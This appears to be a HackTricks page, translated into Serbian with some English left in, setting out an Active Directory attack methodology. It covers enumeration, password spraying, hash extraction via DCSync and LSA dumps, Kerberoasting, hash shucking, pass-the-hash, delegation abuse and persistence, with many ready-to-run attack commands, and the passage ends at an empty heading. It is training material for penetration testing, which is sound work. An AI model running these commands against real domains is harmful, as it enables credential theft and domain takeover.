# Active Directory Metodologija

{{#include ../../banners/hacktricks-training.md}}

## Osnovni pregled

**Active Directory** predstavlja osnovnu tehnologiju koja omogućava mrežnim administratorima da efikasno kreiraju i upravljaju domenima, korisnicima i objektima unutar mreže. Dizajniran je da bude skalabilan, olakšavajući organizaciju velikog broja korisnika u upravljive **grupe** i **podgrupe**, uz kontrolu **prava pristupa** na različitim nivoima.

Struktura **Active Directory** se sastoji od tri osnovna sloja: **domeni**, **stabla** i **šume**. **Domen** obuhvata kolekciju objekata, kao što su **korisnici** ili **uređaji**, koji dele zajedničku bazu podataka. **Stabla** su grupe ovih domena povezane zajedničkom strukturom, a **šuma** predstavlja skup više stabala, međusobno povezanim putem **trust relationships**, formirajući najviši nivo organizacione strukture. Specifična **prava pristupa** i **komunikaciona prava** mogu biti dodeljena na svakom od ovih nivoa.

Ključni pojmovi u okviru **Active Directory** uključuju:

1. **Direktorijum** – Sadrži sve informacije koje se tiču Active Directory objekata.
2. **Objekat** – Označava entitete unutar direktorijuma, uključujući **korisnike**, **grupe**, ili **deljene foldere**.
3. **Domen** – Služi kao kontejner za direktorijumske objekte; više domena može koegzistirati unutar **šume**, pri čemu svaki održava sopstvenu kolekciju objekata.
4. **Stablo** – Grupisanje domena koja dele zajednički root domen.
5. **Šuma** – Najviši nivo organizacione strukture u Active Directory, sastavljena od više stabala sa **trust relationships** između njih.

**Active Directory Domain Services (AD DS)** obuhvata niz servisa ključnih za centralizovano upravljanje i komunikaciju unutar mreže. Ti servisi obuhvataju:

1. **Domain Services** – Centralizuje skladištenje podataka i upravlja interakcijama između **korisnika** i **domena**, uključujući **authentication** i funkcionalnosti pretrage.
2. **Certificate Services** – Nadgleda kreiranje, distribuciju i upravljanje bezbednim **digital certificates**.
3. **Lightweight Directory Services** – Podržava aplikacije koje koriste direktorijum preko **LDAP protocol**.
4. **Directory Federation Services** – Obezbeđuje mogućnosti **single-sign-on** za autentifikaciju korisnika kroz više web aplikacija u jednoj sesiji.
5. **Rights Management** – Pomaže u zaštiti autorskih materijala regulisanjem neautorizovane distribucije i upotrebe.
6. **DNS Service** – Ključan za rešavanje **domain names**.

Za detaljnije objašnjenje pogledaj: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Autentifikacija**

Da bi naučio kako da **napadneš AD**, potrebno je da veoma dobro razumeš **Kerberos authentication process**.\
[**Pročitaj ovu stranicu ako još ne znaš kako funkcioniše.**](kerberos-authentication.md)

## Cheat Sheet

Možeš posetiti [https://wadcoms.github.io/](https://wadcoms.github.io) da brzo pogledaš koje komande možeš pokrenuti za enumeraciju/eksploataciju AD.

> [!WARNING]
> Kerberos komunikacija zahteva potpuno kvalifikovano ime (FQDN) za izvođenje akcija. Ako pokušaš da pristupiš mašini preko IP adrese, koristiće NTLM, a ne Kerberos.

## Recon Active Directory (No creds/sessions)

Ako imaš pristup AD okruženju ali nemaš nikakve kredencijale/sesije, možeš:

- **Pentest the network:**
- Skeniraj mrežu, pronađi mašine i otvorene portove i pokušaj da **eksploatišeš ranjivosti** ili **izvučeš kredencijale** iz njih (na primer, [printers could be very interesting targets](ad-information-in-printers.md)).
- Enumeracija DNS-a može pružiti informacije o ključnim serverima u domenu kao što su web, printers, shares, vpn, media, itd.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Pogledaj opšti [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) za više informacija o tome kako ovo izvesti.
- **Proveri null i Guest pristup na smb servisima** (ovo neće raditi na modernim verzijama Windows-a):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Detaljniji vodič o tome kako da enumerišeš SMB server možeš pronaći ovde:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Detaljniji vodič o enumeraciji LDAP-a možeš pronaći ovde (obrati posebnu pažnju na anonimni pristup):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Sakupi kredencijale [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Pristupi hostu [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Sakupi kredencijale izlažući lažne UPnP servise pomoću [**evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Izdvoji korisnička imena/ime iz internih dokumenata, društvenih mreža, servisa (uglavnom web) unutar domen okruženja, kao i iz javno dostupnih izvora.
- Ako pronađeš kompletna imena zaposlenih u kompaniji, možeš pokušati različite AD konvencije za korisnička imena ([**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Najčešće konvencije su: _NameSurname_, _Name.Surname_, _NamSur_ (3 slova od svakog), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Alati:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumeracija korisnika

- **Anonymous SMB/LDAP enum:** Pogledaj stranice za [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) i [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Kada se zatraži nevažeće korisničko ime, server će odgovoriti koristeći Kerberos error code _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, omogućavajući nam da odredimo da je korisničko ime nevažeće. **Važeća korisnička imena** će izazvati ili TGT u AS-REP odgovoru ili grešku _KRB5KDC_ERR_PREAUTH_REQUIRED_, što ukazuje da je korisnik obavezan da izvrši pre-autentifikaciju.
- **No Authentication against MS-NRPC**: Korišćenjem auth-level = 1 (No authentication) protiv MS-NRPC (Netlogon) interfejsa na domain controller-ima. Metod poziva funkciju `DsrGetDcNameEx2` nakon bindovanja MS-NRPC interfejsa da proveri da li korisnik ili računar postoji bez ikakvih kredencijala. Alat [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementira ovu vrstu enumeracije. Istraživanje se može pronaći [ovde](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf).
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Ako pronađete jedan od ovih servera u mreži, možete takođe izvršiti **user enumeration against it**. Na primer, možete koristiti alat [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> You can find lists of usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  and this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> However, you should have the **name of the people working on the company** from the recon step you should have performed before this. With the name and surname you could used the script [**namemash.py**](https://gist.github.com/superkojiman/11076951) to generate potential valid usernames.

### Knowing one or several usernames

Ok, so you know you have already a valid username but no passwords... Then try:

- [**ASREPRoast**](asreproast.md): Ako korisnik **nema** atribut _DONT_REQ_PREAUTH_ možete **zatražiti AS_REP poruku** za tog korisnika koja će sadržati neke podatke šifrovane izvedenicom korisničke lozinke.
- [**Password Spraying**](password-spraying.md): Probajte najčešće lozinke za svakog od otkrivenih korisnika; možda neki korisnik koristi lošu lozinku (imajte u vidu politiku lozinki).
- Note that you can also **spray OWA servers** to try to get access to the users mail servers.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Možda ćete moći da **dobijete** neke challenge **hashes** za razbijanje trovanjem (poisoning) određenih protokola na **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Ako ste uspeli da enumerišete Active Directory imaćete **više emails i bolje razumevanje mreže**. Možda ćete moći da prisilite NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) da dobijete pristup AD env.

### Steal NTLM Creds

Ako možete da **pristupite drugim PCs ili shares** koristeći **null or guest user**, možete **postaviti fajlove** (npr. SCF file) koji, ako se na neki način otvore, će pokrenuti NTLM autentifikaciju prema vama tako da možete **ukrasti** **NTLM challenge** da biste ga razbili:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** tretira svaki NT hash koji već posedujete kao kandidatsku lozinku za druge, sporije formate čiji se ključni materijal direktno izvodi iz NT hasha. Umesto brutalnog pretraživanja dugih lozinki u Kerberos RC4 tiketima, NetNTLM challengima, ili keširanim kredencijalima, ubacite NT hasheve u Hashcat-ove NT-candidate režime i dozvolite mu da proveri reuse lozinki bez ikada saznanja plaintext-a. Ovo je posebno moćno posle kompromitovanja domena kada možete sakupiti hiljade aktuelnih i istorijskih NT hasheva.

Koristite shucking kada:

- Imate NT korpus iz DCSync, SAM/SECURITY dump-ova, ili credential vault-ova i treba da testirate reuse u drugim domenima/forest-ovima.
- Uhvatite RC4-baziran Kerberos materijal (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM odgovore, ili DCC/DCC2 blob-ove.
- Želite brzo dokazati reuse za duge, nerazbavljive passphrase-ove i odmah pivot-ovati putem Pass-the-Hash.

Tehnika **ne radi** protiv tipova enkripcije čiji ključevi nisu NT hash (npr. Kerberos etype 17/18 AES). Ako domen zahteva samo AES, morate se vratiti na regularne password režime.

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` with history to grab the largest possible set of NT hashes (and their previous values):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries dramatically widen the candidate pool because Microsoft can store up to 24 previous hashes per account. For more ways to harvest NTDS secrets see:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (or Mimikatz `lsadump::sam /patch`) извлачи локалне SAM/SECURITY podatke i keširane domen prijave (DCC/DCC2). Deduplicirajte i dodajte te hasheve u isti `nt_candidates.txt` fajl.
- **Track metadata** – Čuvajte username/domain koji je proizveo svaki hash (čak i ako wordlist sadrži samo hex). Poklapanje hasheva odmah govori koji principal ponovo koristi lozinku kada Hashcat ispiše pobednički kandidat.
- Prefer candidates from the same forest or a trusted forest; that maximizes the chance of overlap when shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat derives the RC4 key from each NT candidate and validates the `$krb5tgs$23$...` blob. A match confirms that the service account uses one of your existing NT hashes.

3. Immediately pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

You can optionally recover the plaintext later with `hashcat -m 1000 <matched_hash> wordlists/` if needed.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons from a compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. A successful match yields the NT hash already known in your list, proving that the cached user is reusing a password. Use it directly for PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) or brute-force it in fast NTLM mode to recover the string.

The exact same workflow applies to NetNTLM challenge-responses (`-m 27000/27100`) and DCC (`-m 31500`). Once a match is identified you can launch relay, SMB/WMI/WinRM PtH, or re-crack the NT hash with masks/rules offline.



## Enumerating Active Directory WITH credentials/session

For this phase you need to have **compromised the credentials or a session of a valid domain account.** If you have some valid credentials or a shell as a domain user, **you should remember that the options given before are still options to compromise other users**.

Before start the authenticated enumeration you should know what is the **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Having compromised an account is a **big step to start compromising the whole domain**, because you are going to be able to start the **Active Directory Enumeration:**

Regarding [**ASREPRoast**](asreproast.md) you can now find every possible vulnerable user, and regarding [**Password Spraying**](password-spraying.md) you can get a **list of all the usernames** and try the password of the compromised account, empty passwords and new promising passwords.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use [**powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

It's very easy to obtain all the domain usernames from Windows (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). In Linux, you can use: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` or `enum4linux -a -u "user" -p "password" <DC IP>`

> Even if this Enumeration section looks small this is the most important part of all. Access the links (mainly the one of cmd, powershell, powerview and BloodHound), learn how to enumerate a domain and practice until you feel comfortable. During an assessment, this will be the key moment to find your way to DA or to decide that nothing can be done.

### Kerberoast

Kerberoasting involves obtaining **TGS tickets** used by services tied to user accounts and cracking their encryption—which is based on user passwords—**offline**.

More about this in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Once you have obtained some credentials you could check if you have access to any **machine**. For that matter, you could use **CrackMapExec** to attempt connecting on several servers with different protocols, accordingly to your ports scans.

### Local Privilege Escalation

If you have compromised credentials or a session as a regular domain user and you have **access** with this user to **any machine in the domain** you should try to find your way to **escalate privileges locally and looting for credentials**. This is because only with local administrator privileges you will be able to **dump hashes of other users** in memory (LSASS) and locally (SAM).

There is a complete page in this book about [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) and a [**checklist**](../checklist-windows-privilege-escalation.md). Also, don't forget to use [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

It's very **unlikely** that you will find **tickets** in the current user **giving you permission to access** unexpected resources, but you could check:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Ako ste uspeli da enumerišete Active Directory imaćete **više email-ova i bolje razumevanje mreže**. Možda ćete moći da izvršite NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Traži Creds u Computer Shares | SMB Shares

Sada kada imate neke osnovne credentials, treba da proverite da li možete da **pronađete** neke **zanimljive fajlove deljene unutar AD-a**. Možete to raditi ručno, ali je to veoma dosadan i repetitivan zadatak (pogotovo ako nađete stotine dokumenata koje treba proveriti).

[**Pratite ovaj link da saznate o alatima koje možete koristiti.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Ako možete da pristupite drugim PCs ili shares, možete **postaviti fajlove** (npr. SCF file) koji, ako ih neko otvori, će pokrenuti **NTLM authentication against you** tako da možete **steal** **the NTLM challenge** da ga razbijete:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Ova ranjivost je omogućavala bilo kom autentifikovanom korisniku da **compromise the domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Za sledeće tehnike običan domain user nije dovoljan, potrebni su posebni privilegiji/credentials da biste izveli ove napade.**

### Hash extraction

Nadamo se da ste uspeli da **compromise neki local admin** nalog koristeći [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Then, its time to dump all the hashes in memory and locally.\
[**Pročitajte ovu stranicu o različitim načinima dobijanja hash-ova.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Kada imate hash korisnika**, možete ga koristiti da ga **impersonate**.\
Treba da koristite neki **tool** koji će **perform** **NTLM authentication using** taj **hash**, **ili** možete kreirati novi **sessionlogon** i **inject** taj **hash** u **LSASS**, tako da kada se bilo koja **NTLM authentication** izvrši, taj **hash će biti korišćen.** Poslednja opcija je ono što radi mimikatz.\
[**Pročitajte ovu stranicu za više informacija.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Ovaj napad ima za cilj da **use the user NTLM hash to request Kerberos tickets**, kao alternativa uobičajenom Pass The Hash preko NTLM protokola. Stoga, ovo može biti posebno **useful in networks where NTLM protocol is disabled** i gde je dozvoljen samo **Kerberos** kao autentifikacioni protokol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

U metodi napada **Pass The Ticket (PTT)**, napadači **steal a user's authentication ticket** umesto njegove lozinke ili vrednosti hasha. Taj ukradeni ticket se potom koristi za **impersonate the user**, čime se dobija neovlašćen pristup resursima i servisima unutar mreže.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Ako imate **hash** ili **password** lokalnog **administrator**a, trebalo bi da pokušate da **login locally** na drugim **PCs** sa tim.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Imajte na umu da je ovo prilično **bučno** i da bi **LAPS** to **ublažio**.

### MSSQL zloupotreba i pouzdane veze

Ako korisnik ima privilegije za **pristup MSSQL instancama**, mogao bi ih iskoristiti za **izvršavanje komandi** na MSSQL hostu (ako se izvršava kao SA), **krađu** NetNTLM **hash**-a ili čak izvođenje **relay attack**.\
Takođe, ako je MSSQL instanca poverena (database link) od strane druge MSSQL instance i korisnik ima privilegije nad tom poverenom bazom, moći će da **iskoristi trust relationship da izvršava upite i u drugoj instanci**. Ova poverenja se mogu nizati i u nekom trenutku korisnik može pronaći pogrešno konfigurisanu bazu u kojoj može izvršavati komande.\
**Veze između baza rade čak i preko forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Zloupotreba IT asset/deployment platformi

Softver za inventar i deployment treće strane često otkriva snažne puteve do kredencijala i izvršavanja koda. Vidi:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Neograničena delegacija

Ako nađete bilo koji Computer object sa atributom [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) i imate domenske privilegije na tom računaru, bićete u mogućnosti da izvučete TGT-ove iz memorije za svakog korisnika koji se prijavi na taj računar.\
Dakle, ako se **Domain Admin prijavi na računar**, moći ćete da izvučete njegov TGT i predstavljate se kao on koristeći [Pass the Ticket](pass-the-ticket.md).\
Zahvaljujući constrained delegation možete čak **automatski kompromitovati Print Server** (nadamo se da će to biti DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Ograničena delegacija

Ako je korisniku ili računaru dozvoljena "Constrained Delegation", moći će da **predstavlja bilo kog korisnika kako bi pristupio nekim servisima na računaru**.\
Ako **osvojite hash** tog korisnika/računara, moći ćete da **predstavljate bilo kog korisnika** (čak i domain admine) da pristupite nekim servisima.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Delegacija ograničena na resurse

Imanje **WRITE** privilegije nad Active Directory objektom udaljenog računara omogućava postizanje izvršenja koda sa **povišenim privilegijama**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Zloupotreba Permissions/ACLs

Kompromentovani korisnik može imati neke **zanimljive privilegije nad određenim domen objektima** koje bi vam omogućile da **kretanjem lateralno/eskalacijom** kasnije povećate privilegije.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Zloupotreba Printer Spooler servisa

Otkrivanje **Spool servisa koji osluškuje** unutar domena može se **zloupotrebiti** za **pribavljanje novih kredencijala** i **eskalaciju privilegija**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Zloupotreba sesija trećih strana

Ako **drugi korisnici** **pristupaju** **kompromitovanom** računaru, moguće je **prikupiti kredencijale iz memorije** pa čak i **ubrizgati beacone u njihove procese** kako biste se predstavljali kao oni.\
Obično korisnici pristupaju sistemu preko RDP-a, pa evo kako izvesti par napada nad sesijama trećih strana RDP-a:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** obezbeđuje sistem za upravljanje **lokalnim Administrator lozinkama** na računarima priključenim na domen, osiguravajući da su **nasumične**, jedinstvene i često **menjane**. Ove lozinke se čuvaju u Active Directory-ju i pristup njima kontrolišu ACL-ovi koji su dodeljeni samo autorizovanim korisnicima. Sa dovoljnim dozvolama za pristup ovim lozinkama, postaje moguće pivot-ovanje na druge računare.


{{#ref}}
laps.md
{{#endref}}

### Krađa sertifikata

**Prikupljanje sertifikata** sa kompromitovanog računara može biti način da se eskaliraju privilegije unutar okruženja:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Zloupotreba template-ova sertifikata

Ako su konfigurisani **ranjivi template-ovi**, moguće ih je zloupotrebiti za eskalaciju privilegija:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}

## Post-eksploatacija sa nalogom visokih privilegija

### Izdvajanje domen kredencijala

Kada dobijete **Domain Admin** ili još bolje **Enterprise Admin** privilegije, možete **ispeglati** **domen bazu podataka**: _ntds.dit_.

[**Više informacija o DCSync napadu može se naći ovde**](dcsync.md).

[**Više informacija o tome kako ukrasti NTDS.dit može se naći ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc kao persistencija

Neke od tehnika opisanih ranije mogu se koristiti za persistenciju.\
Na primer možete:

- Napraviti korisnike ranjivim na [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Napraviti korisnike ranjivim na [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Dodeliti [**DCSync**](#dcsync) privilegije korisniku

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Silver Ticket napad kreira **legitimnu Ticket Granting Service (TGS) kartu** za određeni servis koristeći **NTLM hash** (na primer, **hash PC account-a**). Ova metoda se koristi za **pristup privilegijama servisa**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Golden Ticket napad uključuje napadača koji dobija pristup **NTLM hash-u krbtgt account-a** u Active Directory (AD) okruženju. Ovaj nalog je specijalan jer se koristi za potpisivanje svih **Ticket Granting Tickets (TGTs)**, koji su ključni za autentifikaciju unutar AD mreže.

Kada napadač dobije ovaj hash, može kreirati **TGT-ove** za bilo koji nalog koji želi (Silver ticket napad).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Ovo su kao golden tickets, ali izgrađeni na način koji **zaobilazi uobičajene mehanizme detekcije golden ticket-ova.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Persistencija naloga putem sertifikata**

**Posedovanje sertifikata naloga ili mogućnost njihovog zahteva** predstavlja vrlo dobar način za održavanje persistencije na korisničkom nalogu (čak i ako korisnik promeni lozinku):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Persistencija domena putem sertifikata**

**Korišćenjem sertifikata moguće je takođe održavati persistenciju sa visokim privilegijama unutar domena:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder grupa

Objekat **AdminSDHolder** u Active Directory-ju osigurava bezbednost **privilegovanih grupa** (kao što su Domain Admins i Enterprise Admins) tako što primenjuje standardizovan **Access Control List (ACL)** na ove grupe kako bi se sprečile neautorizovane promene. Međutim, ova funkcija se može zloupotrebiti; ako napadač izmeni ACL AdminSDHolder-a da dodeli puna prava običnom korisniku, taj korisnik dobija široku kontrolu nad svim privilegovanim grupama. Ova bezbednosna mera, koja bi trebala da štiti, može se okrenuti protiv sistema i omogućiti neovlašćen pristup ukoliko se ne prati pažljivo.

[**Više informacija o AdminDSHolder grupi ovde.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM kredencijali

U svakom **Domain Controller-u (DC)** postoji lokalni administratorski nalog. Dobijanjem administratorskih prava na takvom računaru, lokalni Administrator hash može se izvući koristeći **mimikatz**. Nakon toga je neophodna izmena registra da bi se **omogućila upotreba ove lozinke**, dozvoljavajući udaljeni pristup lokalnom Administrator nalogu.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL persistencija

Možete **dati neke specijalne dozvole** korisniku nad određenim domen objektima koje će tom korisniku omogućiti **eskalaciju privilegija u budućnosti**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

